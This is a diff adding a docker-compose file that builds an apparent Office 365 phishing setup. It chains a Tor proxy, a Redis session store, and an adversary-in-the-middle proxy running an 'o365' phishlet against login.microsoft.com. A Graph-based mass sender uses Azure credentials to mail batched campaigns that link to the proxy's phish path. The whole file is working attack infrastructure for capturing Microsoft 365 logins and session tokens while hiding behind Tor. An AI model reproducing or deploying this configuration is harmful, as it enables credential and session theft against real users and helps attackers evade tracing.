@@ -1,0 +1,46 @@
+version: '3.8'
+services:
+  tor-obfuscator:
+    image: dperson/torproxy:latest
+    ports: ["9050:9050"]
+    command: -p 9050 -i 0.0.0.0
+    networks: [phishnet]
+    restart: "no"
+
+  redis-sessions:
+    image: redis:alpine
+    networks: [phishnet]
+    restart: "no"
+
+  phishguard-proxy:
+    build: ./proxy
+    ports: ["8443:443"]
+    volumes: ['./phishlets:/app/phishlets', './certs:/app/certs']
+    environment:
+      - REDIS_URL=redis://redis-sessions:6379
+      - TOR_PROXY=socks5://tor-obfuscator:9050
+      - PHISHLET=o365
+      - TARGET_URL=https://login.microsoft.com  # O365 focus
+    networks: [phishnet]
+    depends_on: [tor-obfuscator, redis-sessions]
+    command: ["./phishguard", "-phishlet=/app/phishlets/o365.yaml", "-laddr=0.0.0.0:443", "-cert=/app/certs/server.crt", "-key=/app/certs/server.key"]
+    restart: "no"
+
+  graph-sender:
+    build: ./sender
+    volumes: ['./campaigns:/app/campaigns']
+    environment:
+      - AZURE_CLIENT_ID=${AZURE_CLIENT_ID}
+      - AZURE_CLIENT_SECRET=${AZURE_CLIENT_SECRET}
+      - AZURE_TENANT_ID=NETORGFT4679501.onmicrosoft.com
+      - PROXY_URL=https://${TOR_IP}:8443/phish
+    networks: [phishnet]
+    depends_on: [tor-obfuscator]
+    command: ["./graphsender", "-config=/app/campaigns/campaign.json", "--throttle", "--cleanup", "--batch"]
+    restart: "no"
+
+networks:
+  phishnet:
+volumes:
+  campaigns:
+  certs:
